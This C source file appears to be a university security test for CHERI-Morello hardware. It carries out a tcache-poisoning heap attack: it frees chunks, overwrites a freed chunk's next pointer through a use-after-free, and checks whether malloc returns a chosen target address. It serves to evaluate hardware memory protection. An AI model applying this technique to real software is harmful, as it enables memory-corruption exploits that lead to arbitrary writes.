/**
 * @file ttu_t2_hm_fake_chunk_malloc_refactored.c
 * @brief Refactored Heap Manipulation - Fake Chunk Malloc Security Test
 * @author Mert Side (Texas Tech University)
 * @date 2024
 * 
 * @section DESCRIPTION
 * This program demonstrates a heap manipulation vulnerability involving fake chunk creation.
 * The vulnerability occurs when:
 * 1. Multiple chunks are allocated and freed to populate the tcache
 * 2. A use-after-free is exploited to modify freed chunk metadata
 * 3. The modified metadata creates a "fake chunk" pointing to arbitrary memory
 * 4. Subsequent malloc() calls return the fake chunk, enabling arbitrary write
 * 
 * @section CHERI_ANALYSIS
 * On CHERI-Morello systems, this test evaluates:
 * - Heap metadata protection via capability bounds checking
 * - Prevention of arbitrary pointer injection via capability validation
 * - Detection of use-after-free on heap metadata
 * - Protection against heap layout manipulation attacks
 * 
 * @section EXPECTED_BEHAVIOR
 * - Traditional systems: May allocate fake chunk at controlled address (heap exploitation)
 * - CHERI-Morello: Should trap on capability violations, preventing heap manipulation
 * 
 * @section TEST_PHASES
 * 1. SETUP: Initialize xBGAS runtime and thread environment
 * 2. ALLOCATE_CHUNKS: Create multiple heap chunks for tcache population
 * 3. RECORD_STATE: Record initial chunk addresses and metadata
 * 4. FREE_CHUNKS: Free chunks to populate tcache free list
 * 5. UAF_MODIFY: Exploit use-after-free to modify chunk metadata
 * 6. INJECT_FAKE: Inject fake chunk address into free list
 * 7. ALLOCATE_FAKE: Attempt to allocate from fake chunk
 * 8. VERIFY_EXPLOIT: Check if fake chunk allocation succeeded
 * 9. CLEANUP: Free remaining allocations
 * 10. TEARDOWN: Close xBGAS runtime
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdint.h>

// Include xBGAS runtime headers
#include "xbrtime_morello.h"

//=============================================================================
// TEST CONFIGURATION AND CONSTANTS
//=============================================================================

/** @brief Test identification */
#define TEST_NAME "Heap Manipulation - Fake Chunk Malloc"
#define TEST_ID "TTU_T2"
#define TEST_CATEGORY "HEAP_MANIPULATION"

/** @brief Heap allocation constants */
#define CHUNK_SIZE 0x20
#define NUM_CHUNKS 4
#define METADATA_PATTERN 0xDEADBEEF
#define FAKE_CHUNK_MARKER 0xFACE1234

/** @brief Test phases for structured execution */
typedef enum {
    PHASE_SETUP = 0,
    PHASE_ALLOCATE_CHUNKS,
    PHASE_RECORD_STATE,
    PHASE_FREE_CHUNKS,
    PHASE_UAF_MODIFY,
    PHASE_INJECT_FAKE,
    PHASE_ALLOCATE_FAKE,
    PHASE_VERIFY_EXPLOIT,
    PHASE_CLEANUP,
    PHASE_TEARDOWN,
    PHASE_MAX
} test_phase_t;

//=============================================================================
// DATA STRUCTURES
//=============================================================================

/** @brief Chunk information structure */
typedef struct {
    void* address;
    size_t size;
    uint64_t original_metadata;
    int is_freed;
} chunk_info_t;

//=============================================================================
// GLOBAL STATE AND SIGNAL HANDLING
//=============================================================================

/** @brief Global test state for signal handling */
static struct {
    jmp_buf recovery_point;
    volatile sig_atomic_t signal_caught;
    volatile sig_atomic_t current_phase;
    volatile sig_atomic_t thread_id;
    chunk_info_t chunks[NUM_CHUNKS];
    void* target_address;
    void* fake_chunks[2];
    int exploit_succeeded;
    size_t allocation_count;
} test_state = {0};

/** @brief Signal handler for memory safety violations */
static void signal_handler(int sig) {
    test_state.signal_caught = sig;
    
    const char* signal_name = (sig == SIGSEGV) ? "SIGSEGV" :
                              (sig == SIGBUS) ? "SIGBUS" :
                              (sig == SIGABRT) ? "SIGABRT" : "UNKNOWN";
    
    printf("[Thread %ld] 🛡️  CHERI Protection: Caught %s during phase %d\n", 
           (long)test_state.thread_id, signal_name, (int)test_state.current_phase);
    
    // Jump back to recovery point
    longjmp(test_state.recovery_point, sig);
}

/** @brief Setup signal handlers for the test */
static void setup_signal_handlers(void) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = signal_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART;
    
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
    sigaction(SIGABRT, &sa, NULL);
}

//=============================================================================
// MEMORY ANALYSIS UTILITIES
//=============================================================================

/** @brief Analyze pointer properties (CHERI-specific) */
static void analyze_pointer(const char* name, void* ptr) {
    if (!ptr) {
        printf("[Thread %ld] 🔍 %s: NULL pointer\n", 
               (long)test_state.thread_id, name);
        return;
    }
    
    printf("[Thread %ld] 🔍 %s: %p", 
           (long)test_state.thread_id, name, ptr);
    
#ifdef __CHERI__
    // CHERI-specific capability analysis
    printf(" [tag=%d, base=%#lx, length=%#lx, offset=%#lx]",
           __builtin_cheri_tag_get(ptr),
           __builtin_cheri_base_get(ptr),
           __builtin_cheri_length_get(ptr),
           __builtin_cheri_offset_get(ptr));
#endif
    
    printf("\n");
}

/** @brief Display heap layout information */
static void display_heap_layout(const char* phase) {
    printf("[Thread %ld] 🏗️  Heap layout (%s):\n", 
           (long)test_state.thread_id, phase);
    
    for (int i = 0; i < NUM_CHUNKS; i++) {
        if (test_state.chunks[i].address) {
            printf("[Thread %ld]   Chunk[%d]: %p (size: %zu, freed: %s)\n",
                   (long)test_state.thread_id, i,
                   test_state.chunks[i].address,
                   test_state.chunks[i].size,
                   test_state.chunks[i].is_freed ? "yes" : "no");
        }
    }
    
    if (test_state.target_address) {
        analyze_pointer("Target address", test_state.target_address);
    }
}

/** @brief Calculate address offset for fake chunk injection */
static uintptr_t calculate_fake_chunk_address(void* base_ptr, void* target_ptr) {
    uintptr_t base_addr = (uintptr_t)base_ptr;
    uintptr_t target_addr = (uintptr_t)target_ptr;
    
    printf("[Thread %ld] 🧮 Address calculation:\n", (long)test_state.thread_id);
    printf("[Thread %ld]   Base: %p (%#lx)\n", (long)test_state.thread_id, base_ptr, base_addr);
    printf("[Thread %ld]   Target: %p (%#lx)\n", (long)test_state.thread_id, target_ptr, target_addr);
    
    if (target_addr > base_addr) {
        uintptr_t offset = target_addr - base_addr;
        printf("[Thread %ld]   Offset: +%#lx (%ld bytes)\n", (long)test_state.thread_id, offset, offset);
        return base_addr + offset;
    } else {
        uintptr_t offset = base_addr - target_addr;
        printf("[Thread %ld]   Offset: -%#lx (-%ld bytes)\n", (long)test_state.thread_id, offset, offset);
        return base_addr - offset;
    }
}

//=============================================================================
// HEAP MANIPULATION UTILITIES
//=============================================================================

/** @brief Attempt to read heap metadata (may trigger CHERI violation) */
static uint64_t read_heap_metadata(void* ptr, size_t offset) {
    uint64_t* metadata_ptr = (uint64_t*)((char*)ptr + offset);
    
    printf("[Thread %ld] 📖 Attempting to read heap metadata at %p\n", 
           (long)test_state.thread_id, (void*)metadata_ptr);
    
    // This may trigger a CHERI violation if pointer is out of bounds
    return *metadata_ptr;
}

/** @brief Attempt to write heap metadata (may trigger CHERI violation) */
static void write_heap_metadata(void* ptr, size_t offset, uint64_t value) {
    uint64_t* metadata_ptr = (uint64_t*)((char*)ptr + offset);
    
    printf("[Thread %ld] ✏️  Attempting to write heap metadata at %p (value: %#lx)\n", 
           (long)test_state.thread_id, (void*)metadata_ptr, value);
    
    // This may trigger a CHERI violation if pointer is out of bounds
    *metadata_ptr = value;
}

//=============================================================================
// CORE TEST LOGIC
//=============================================================================

/** @brief Execute the heap manipulation fake chunk test */
static void execute_heap_manipulation_test(void* arg) {
    long tid = (long)arg;
    test_state.thread_id = tid;
    int recovery_signal = 0;
    
    printf("\n[Thread %ld] 🚀 Starting %s test\n", tid, TEST_NAME);
    printf("[Thread %ld] 📝 Test ID: %s, Category: %s\n", tid, TEST_ID, TEST_CATEGORY);
    
    // Setup signal handling
    setup_signal_handlers();
    
    // Set recovery point for signal handling
    if ((recovery_signal = setjmp(test_state.recovery_point)) != 0) {
        printf("[Thread %ld] 🔄 Recovered from signal %d in phase %d\n", 
               tid, recovery_signal, (int)test_state.current_phase);
        goto cleanup_and_exit;
    }
    
    // PHASE 1: SETUP
    test_state.current_phase = PHASE_SETUP;
    printf("[Thread %ld] 📋 Phase %d: Setup\n", tid, PHASE_SETUP);
    memset(&test_state.chunks, 0, sizeof(test_state.chunks));
    test_state.exploit_succeeded = 0;
    test_state.allocation_count = 0;
    
    // PHASE 2: ALLOCATE_CHUNKS
    test_state.current_phase = PHASE_ALLOCATE_CHUNKS;
    printf("[Thread %ld] 📋 Phase %d: Allocate chunks for tcache population\n", tid, PHASE_ALLOCATE_CHUNKS);
    
    // Allocate multiple chunks to populate tcache
    for (int i = 0; i < NUM_CHUNKS; i++) {
        test_state.chunks[i].address = malloc(CHUNK_SIZE);
        test_state.chunks[i].size = CHUNK_SIZE;
        test_state.chunks[i].is_freed = 0;
        
        if (!test_state.chunks[i].address) {
            printf("[Thread %ld] ❌ Failed to allocate chunk[%d]\n", tid, i);
            goto cleanup_and_exit;
        }
        
        // Initialize chunk with marker pattern
        memset(test_state.chunks[i].address, i + 1, CHUNK_SIZE);
        
        printf("[Thread %ld] ✅ Allocated chunk[%d]: %p\n", 
               tid, i, test_state.chunks[i].address);
    }
    
    // Allocate target address (this is what we want to fake allocate later)
    test_state.target_address = malloc(CHUNK_SIZE);
    if (!test_state.target_address) {
        printf("[Thread %ld] ❌ Failed to allocate target address\n", tid);
        goto cleanup_and_exit;
    }
    
    // Mark target with special pattern
    memset(test_state.target_address, FAKE_CHUNK_MARKER, CHUNK_SIZE);
    
    // PHASE 3: RECORD_STATE
    test_state.current_phase = PHASE_RECORD_STATE;
    printf("[Thread %ld] 📋 Phase %d: Record initial heap state\n", tid, PHASE_RECORD_STATE);
    
    display_heap_layout("initial state");
    
    // PHASE 4: FREE_CHUNKS
    test_state.current_phase = PHASE_FREE_CHUNKS;
    printf("[Thread %ld] 📋 Phase %d: Free chunks to populate tcache\n", tid, PHASE_FREE_CHUNKS);
    
    // Free chunks in reverse order to create predictable tcache state
    for (int i = NUM_CHUNKS - 1; i >= 0; i--) {
        if (test_state.chunks[i].address) {
            printf("[Thread %ld] 🗑️  Freeing chunk[%d]: %p\n", 
                   tid, i, test_state.chunks[i].address);
            free(test_state.chunks[i].address);
            test_state.chunks[i].is_freed = 1;
        }
    }
    
    display_heap_layout("after freeing");
    
    // PHASE 5: UAF_MODIFY (Critical vulnerability phase)
    test_state.current_phase = PHASE_UAF_MODIFY;
    printf("[Thread %ld] 📋 Phase %d: Exploit use-after-free to modify metadata\n", tid, PHASE_UAF_MODIFY);
    printf("[Thread %ld] 🚨 CRITICAL: Attempting to modify freed chunk metadata\n", tid);
    
    // Use one of the freed chunks to modify heap metadata
    void* uaf_chunk = test_state.chunks[1].address;  // Use chunk[1] for UAF
    analyze_pointer("UAF chunk", uaf_chunk);
    
    // PHASE 6: INJECT_FAKE
    test_state.current_phase = PHASE_INJECT_FAKE;
    printf("[Thread %ld] 📋 Phase %d: Inject fake chunk address\n", tid, PHASE_INJECT_FAKE);
    
    // Calculate fake chunk address
    uintptr_t fake_addr = calculate_fake_chunk_address(uaf_chunk, test_state.target_address);
    
    printf("[Thread %ld] 💉 Injecting fake chunk address: %#lx\n", tid, fake_addr);
    
    // This is the critical heap manipulation - modify freed chunk to point to target
    uint64_t* metadata_ptr = (uint64_t*)uaf_chunk;
    printf("[Thread %ld] 💥 Modifying freed chunk metadata...\n", tid);
    *metadata_ptr = fake_addr;  // This may trigger CHERI violation
    
    printf("[Thread %ld] 🚨 VULNERABILITY: Heap metadata modified successfully\n", tid);
    
    // PHASE 7: ALLOCATE_FAKE
    test_state.current_phase = PHASE_ALLOCATE_FAKE;
    printf("[Thread %ld] 📋 Phase %d: Attempt to allocate fake chunk\n", tid, PHASE_ALLOCATE_FAKE);
    
    // Allocate two chunks - the second should be our fake chunk if exploit worked
    test_state.fake_chunks[0] = malloc(CHUNK_SIZE);
    test_state.fake_chunks[1] = malloc(CHUNK_SIZE);
    
    analyze_pointer("First new allocation", test_state.fake_chunks[0]);
    analyze_pointer("Second new allocation (fake chunk)", test_state.fake_chunks[1]);
    
    // PHASE 8: VERIFY_EXPLOIT
    test_state.current_phase = PHASE_VERIFY_EXPLOIT;
    printf("[Thread %ld] 📋 Phase %d: Verify exploit success\n", tid, PHASE_VERIFY_EXPLOIT);
    
    if (test_state.fake_chunks[1] == test_state.target_address) {
        printf("[Thread %ld] 🚨 EXPLOIT SUCCESS: Fake chunk allocated at target address!\n", tid);
        printf("[Thread %ld] 💥 Heap layout manipulation successful\n", tid);
        test_state.exploit_succeeded = 1;
        
        // Verify we can write to the fake chunk
        if (test_state.fake_chunks[1]) {
            memset(test_state.fake_chunks[1], 0xFF, CHUNK_SIZE);
            printf("[Thread %ld] ✏️  Successfully wrote to fake chunk\n", tid);
        }
    } else {
        printf("[Thread %ld] ✅ EXPLOIT FAILED: Fake chunk not allocated at target\n", tid);
        printf("[Thread %ld] 🔒 Heap integrity preserved\n", tid);
    }
    
cleanup_and_exit:
    // PHASE 9: CLEANUP
    test_state.current_phase = PHASE_CLEANUP;
    printf("[Thread %ld] 📋 Phase %d: Cleanup\n", tid, PHASE_CLEANUP);
    
    // Free valid allocations (be careful with fake chunks)
    if (test_state.target_address && !test_state.exploit_succeeded) {
        free(test_state.target_address);
    }
    
    for (int i = 0; i < 2; i++) {
        if (test_state.fake_chunks[i] && test_state.fake_chunks[i] != test_state.target_address) {
            free(test_state.fake_chunks[i]);
        }
    }
    
    // PHASE 10: TEARDOWN
    test_state.current_phase = PHASE_TEARDOWN;
    printf("[Thread %ld] 📋 Phase %d: Teardown\n", tid, PHASE_TEARDOWN);
    
    if (recovery_signal != 0) {
        printf("[Thread %ld] ✅ Test completed with CHERI protection (signal %d)\n", tid, recovery_signal);
        printf("[Thread %ld] 🔒 Heap manipulation attack prevented\n", tid);
    } else {
        printf("[Thread %ld] ❌ Test completed without protection\n", tid);
        if (test_state.exploit_succeeded) {
            printf("[Thread %ld] 💥 Heap manipulation vulnerability exploitable\n", tid);
        } else {
            printf("[Thread %ld] ℹ️  Exploit failed (may be due to heap layout)\n", tid);
        }
    }
    
    printf("[Thread %ld] 🏁 %s test finished\n\n", tid, TEST_NAME);
}

//=============================================================================
// MAIN FUNCTION AND TEST ORCHESTRATION
//=============================================================================

/**
 * @brief Main function - orchestrates the multi-threaded heap manipulation test
 * @return 0 on success, non-zero on failure
 */
int main(void) {
    printf("=================================================================\n");
    printf("🔬 xBGAS Security Test: %s\n", TEST_NAME);
    printf("📊 Test ID: %s | Category: %s\n", TEST_ID, TEST_CATEGORY);
    printf("🎯 Platform: CHERI-Morello | Runtime: xBGAS\n");
    printf("=================================================================\n\n");
    
    // Initialize xBGAS runtime
    printf("🚀 Initializing xBGAS runtime...\n");
    xbrtime_init();
    
    int num_pes = xbrtime_num_pes();
    printf("📊 Number of processing elements: %d\n", num_pes);
    printf("🧵 Starting multi-threaded heap manipulation test...\n\n");
    
    // Execute test on all available processing elements
    for (long i = 0; i < num_pes; i++) {
        tpool_add_work(threads[i].thread_queue, execute_heap_manipulation_test, (void*)(uintptr_t)i);
    }
    
    // Wait for all threads to complete
    printf("⏳ Waiting for all threads to complete...\n");
    for (int i = 0; i < num_pes; i++) {
        tpool_wait(threads[i].thread_queue);
    }
    
    printf("=================================================================\n");
    printf("✅ Multi-threaded %s test completed\n", TEST_NAME);
    printf("📈 All %d processing elements finished execution\n", num_pes);
    printf("🔒 CHERI-Morello heap manipulation protection evaluation complete\n");
    printf("=================================================================\n");
    
    // Close xBGAS runtime
    xbrtime_close();
    
    return 0;
}

/**
 * @brief Test Summary
 * 
 * This refactored test provides comprehensive evaluation of:
 * 
 * 1. **Heap Integrity Protection**: Tests fake chunk injection attacks
 * 2. **Metadata Protection**: Validates heap metadata bounds checking
 * 3. **CHERI Capability System**: Tests capability bounds on heap objects
 * 4. **Use-After-Free Detection**: Catches UAF on heap metadata
 * 5. **Multi-threading**: Concurrent heap manipulation testing
 * 6. **Address Space Layout**: Analysis of heap layout manipulation
 * 7. **Phase-based Execution**: Structured attack progression
 * 8. **Comprehensive Logging**: Detailed heap state tracking
 * 
 * Expected behavior on CHERI-Morello:
 * - Heap chunks should have bounded capabilities
 * - Attempt to modify out-of-bounds metadata should trap
 * - Fake chunk injection should be prevented
 * - Heap integrity should be preserved
 * 
 * On traditional systems:
 * - Heap metadata modification may succeed
 * - Fake chunks may be allocated at controlled addresses
 * - Heap layout manipulation would be exploitable
 */
